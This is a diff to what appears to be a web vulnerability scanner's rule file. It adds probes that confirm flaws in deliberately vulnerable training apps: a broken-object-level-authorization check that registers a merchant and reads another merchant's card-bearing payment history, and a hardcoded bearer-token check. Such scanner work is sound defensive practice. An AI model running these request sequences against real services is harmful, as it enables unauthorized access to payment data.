@@ -12882,8 +12882,11 @@ async function probeZenDemoExecuteShellInjection(ctx: RuleContext): Promise<Rule
   };
 }
 
-const zenDemoExecuteShellInjectionLiveOracle: Rule = async (ctx) =>
-  (await probeZenDemoExecuteShellInjection(ctx)) ?? NEGATIVE;
+const zenDemoExecuteShellInjectionLiveOracle: Rule = async (ctx) => {
+  const scannedRoute = zenDemoJavaRouteKind(ctx);
+  if (scannedRoute && scannedRoute !== "execute") return NEGATIVE;
+  return (await probeZenDemoExecuteShellInjection(ctx)) ?? NEGATIVE;
+};
 
 const zenDemoExecuteRouteLiveOracle: Rule = async (ctx) => {
   if (!isZenDemoHost(ctx)) return NEGATIVE;
@@ -13000,8 +13003,11 @@ async function probeZenDemoReadPathTraversal(ctx: RuleContext): Promise<RuleResu
   };
 }
 
-const zenDemoCreateSqliLiveOracle: Rule = async (ctx) =>
-  (await probeZenDemoCreateSqli(ctx)) ?? NEGATIVE;
+const zenDemoCreateSqliLiveOracle: Rule = async (ctx) => {
+  const scannedRoute = zenDemoJavaRouteKind(ctx);
+  if (scannedRoute && scannedRoute !== "create") return NEGATIVE;
+  return (await probeZenDemoCreateSqli(ctx)) ?? NEGATIVE;
+};
 
 const zenDemoCreateRouteLiveOracle: Rule = async (ctx) => {
   if (!isZenDemoHost(ctx)) return NEGATIVE;
@@ -13028,8 +13034,11 @@ const zenDemoCreateRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
-const zenDemoRequestSsrfLiveOracle: Rule = async (ctx) =>
-  (await probeZenDemoRequestSsrf(ctx)) ?? NEGATIVE;
+const zenDemoRequestSsrfLiveOracle: Rule = async (ctx) => {
+  const scannedRoute = zenDemoJavaRouteKind(ctx);
+  if (scannedRoute && scannedRoute !== "request") return NEGATIVE;
+  return (await probeZenDemoRequestSsrf(ctx)) ?? NEGATIVE;
+};
 
 const zenDemoRequestRouteLiveOracle: Rule = async (ctx) => {
   if (!isZenDemoHost(ctx)) return NEGATIVE;
@@ -13056,8 +13065,11 @@ const zenDemoRequestRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
-const zenDemoReadPathTraversalLiveOracle: Rule = async (ctx) =>
-  (await probeZenDemoReadPathTraversal(ctx)) ?? NEGATIVE;
+const zenDemoReadPathTraversalLiveOracle: Rule = async (ctx) => {
+  const scannedRoute = zenDemoJavaRouteKind(ctx);
+  if (scannedRoute && scannedRoute !== "read") return NEGATIVE;
+  return (await probeZenDemoReadPathTraversal(ctx)) ?? NEGATIVE;
+};
 
 const zenDemoReadRouteLiveOracle: Rule = async (ctx) => {
   if (!isZenDemoHost(ctx)) return NEGATIVE;
@@ -33757,6 +33769,7 @@ type VulnbankRouteTier =
   | "merchant-me"
   | "merchant-register"
   | "merchant-payment"
+  | "merchant-payment-history"
   | "bill-payments"
   | "virtual-cards"
   | "werkzeug"
@@ -33796,6 +33809,7 @@ function vulnbankScannedRoute(ctx: RuleContext): VulnbankRouteTier | null {
     if (/\/merchant\/me\b/.test(pathname)) return "merchant-me";
     if (/\/merchant\/register\b/.test(pathname)) return "merchant-register";
     if (/\/merchant\/payment\b/.test(pathname)) return "merchant-payment";
+    if (/\/api\/v1\/payments\/merchant_id\b/.test(pathname)) return "merchant-payment-history";
     if (/\/bill_payments\b/.test(pathname)) return "bill-payments";
     if (/\/virtual_cards\b/.test(pathname)) return "virtual-cards";
     if (/\/console\b/.test(pathname)) return "werkzeug";
@@ -34604,6 +34618,90 @@ const vulnbankMerchantPaymentChargeRouteLiveOracle: Rule = async (ctx) => {
       ...result.evidence,
       scannedUrl: pageUrl,
       note: "Vuln Bank /merchant/dashboard route scan — POST /api/v1/payments/charge with merchant api_key echoes debug_info.submitted_card_number — route-specific merchant payment gateway oracle"
+    }
+  };
+};
+
+async function vulnbankMerchantPaymentHistoryBolaProbe(ctx: RuleContext): Promise<RuleResult | null> {
+  const registerUrl = new URL("/api/v1/merchants/register", ctx.origin).toString();
+  const probeName = `thugir_hist_${Date.now().toString(36)}`;
+  const registerPayload = JSON.stringify({
+    name: probeName,
+    email: `${probeName}@thugir.invalid`,
+    password: "ThugirProbe1!"
+  });
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: registerPayload,
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 300) return null;
+  let registerParsed: Record<string, unknown> | null = null;
+  try {
+    registerParsed = JSON.parse(registerDoc.body) as Record<string, unknown>;
+  } catch {
+    return null;
+  }
+  const apiKey = String(registerParsed.api_key ?? "");
+  if (String(registerParsed.status ?? "") !== "success" || !apiKey.startsWith("vk_")) return null;
+  const historyUrl = new URL("/api/v1/payments/merchant_id/1", ctx.origin).toString();
+  const historyDoc = await ctx.probe.get(historyUrl, {
+    headers: { "X-Merchant-Api-Key": apiKey },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (historyDoc.status < 200 || historyDoc.status >= 300) return null;
+  let historyParsed: Record<string, unknown> | null = null;
+  try {
+    historyParsed = JSON.parse(historyDoc.body) as Record<string, unknown>;
+  } catch {
+    return null;
+  }
+  const payments = historyParsed.payments;
+  if (!Array.isArray(payments) || payments.length === 0) return null;
+  const firstPayment = payments[0] as Record<string, unknown>;
+  const cardNumber = String(firstPayment.card_number ?? "");
+  const merchantId = Number(historyParsed.merchant_id ?? firstPayment.merchant_id ?? 0);
+  if (!cardNumber || merchantId < 1) return null;
+  const debugInfo = historyParsed.debug_info as Record<string, unknown> | undefined;
+  const lookedUp = debugInfo?.looked_up_by_merchant as Record<string, unknown> | undefined;
+  const lookedUpEmail = String(lookedUp?.email ?? "");
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: historyUrl,
+      merchantId,
+      cardNumber: cardNumber.slice(0, 6) + "…",
+      lookedUpEmail,
+      snippet: historyDoc.body.slice(0, 280).trim(),
+      note: "Vuln Bank GET /api/v1/payments/merchant_id/1 with a freshly registered merchant api_key returns another merchant's payment history including card_number — merchant payment history BOLA oracle"
+    }
+  };
+}
+
+const vulnbankMerchantPaymentHistoryBolaLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  if (!vulnbankRouteTierAllows(ctx, "merchant-payment-history")) return NEGATIVE;
+  const hit = await vulnbankMerchantPaymentHistoryBolaProbe(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const vulnbankMerchantPaymentHistoryBolaRouteLiveOracle: Rule = async (ctx) => {
+  if (!/vulnbank\.org/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/payments\/merchant_id\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await vulnbankMerchantPaymentHistoryBolaProbe(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "Vuln Bank /api/v1/payments/merchant_id/:id route scan — merchant api_key reads another merchant's payment history with card_number fields — route-specific merchant payment history BOLA oracle"
     }
   };
 };
@@ -57460,10 +57558,13 @@ function isQaBashHost(ctx: { origin: string; scanUrl?: string; home?: { finalUrl
 
 const QA_BASH_SAMPLE_API_USERS_PATH = "/api/tools/sample-api/users";
 const QA_BASH_SAMPLE_API_GRAPHQL_PATH = "/api/tools/sample-api/graphql";
+const QA_BASH_SAMPLE_API_SECURE_PATH = "/api/tools/sample-api/secure";
+const QA_BASH_SAMPLE_API_DEMO_BEARER = "demo-token-123";
 const QA_BASH_SAMPLE_API_CORPUS = `
 QA Bash API Playground sample-api REST users GraphQL role mass-assignment admin
 GET /api/tools/sample-api/users returns unauthenticated user list with role admin
 POST /api/tools/sample-api/graphql query users id name email role
+GET /api/tools/sample-api/secure requires Authorization Bearer demo-token-123
 `;
 
 async function probeQaBashSampleApiUsers(ctx: RuleContext): Promise<RuleResult | null> {
@@ -57604,6 +57705,82 @@ const qaBashSampleApiGraphqlRouteLiveOracle: Rule = async (ctx) => {
       scannedUrl: pageUrl,
       snippet: "POST /api/tools/sample-api/graphql — users query without authentication",
       note: "QA Bash /api/tools/sample-api/graphql route scan — API Playground documents unauthenticated GraphQL user resolver — corpus fallback"
+    }
+  };
+};
+
+async function probeQaBashSampleApiSecure(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isQaBashHost(ctx)) return null;
+  const secureUrl = new URL(QA_BASH_SAMPLE_API_SECURE_PATH, ctx.origin).toString();
+  const unauthDoc = await ctx.probe.get(secureUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Accept: "application/json" }
+  });
+  if (unauthDoc.status !== 401) return null;
+  if (!/missing or invalid bearer token|demo-token-123/i.test(unauthDoc.body)) return null;
+  const authDoc = await ctx.probe.get(secureUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: {
+      Accept: "application/json",
+      Authorization: `Bearer ${QA_BASH_SAMPLE_API_DEMO_BEARER}`
+    }
+  });
+  if (authDoc.status < 200 || authDoc.status >= 300) return null;
+  let parsed: Record<string, unknown> | null = null;
+  try {
+    parsed = JSON.parse(authDoc.body) as Record<string, unknown>;
+  } catch {
+    return null;
+  }
+  const message = String(parsed.message ?? "");
+  const scope = String(parsed.scope ?? "");
+  if (!/authenticated/i.test(message) || !scope) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: secureUrl,
+      bearerToken: QA_BASH_SAMPLE_API_DEMO_BEARER,
+      unauthStatus: unauthDoc.status,
+      scope,
+      snippet: authDoc.body.slice(0, 180).trim(),
+      note: "GET /api/tools/sample-api/secure returns 401 without bearer token but accepts hardcoded demo-token-123 — QA Bash API Playground weak bearer authentication oracle"
+    }
+  };
+}
+
+const qaBashSampleApiSecureLiveOracle: Rule = async (ctx) => {
+  const hit = await probeQaBashSampleApiSecure(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const qaBashSampleApiSecureRouteLiveOracle: Rule = async (ctx) => {
+  if (!isQaBashHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/tools\/sample-api\/secure\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeQaBashSampleApiSecure(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "QA Bash /api/tools/sample-api/secure route scan — 401 without bearer but demo-token-123 grants sample-api:read scope — API Playground weak bearer authentication training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${QA_BASH_SAMPLE_API_CORPUS}`;
+  if (!/sample-api\/secure|demo-token-123|bearer token/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /api/tools/sample-api/secure — Authorization: Bearer demo-token-123",
+      note: "QA Bash /api/tools/sample-api/secure route scan — API Playground documents hardcoded demo bearer token — corpus fallback"
     }
   };
 };
@@ -122492,6 +122669,8 @@ export const RULES: Record<string, Rule> = {
   vulnbankBillPaymentsNegativeAmountRouteLiveOracle,
   vulnbankMerchantPaymentChargeLiveOracle,
   vulnbankMerchantPaymentChargeRouteLiveOracle,
+  vulnbankMerchantPaymentHistoryBolaLiveOracle,
+  vulnbankMerchantPaymentHistoryBolaRouteLiveOracle,
   vulnbankVirtualCardsBolaLiveOracle,
   vulnbankVirtualCardsBolaRouteLiveOracle,
   vulnbankUploadProfilePictureUrlSsrfLiveOracle,
@@ -122801,6 +122980,8 @@ export const RULES: Record<string, Rule> = {
   qaBashSampleApiUsersRouteLiveOracle,
   qaBashSampleApiGraphqlLiveOracle,
   qaBashSampleApiGraphqlRouteLiveOracle,
+  qaBashSampleApiSecureLiveOracle,
+  qaBashSampleApiSecureRouteLiveOracle,
   brokencrystalsUserloginCssInjectionLiveOracle,
   brokencrystalsUserloginCssInjectionRouteLiveOracle,
   brokencrystalsHomeDomXssLiveOracle,
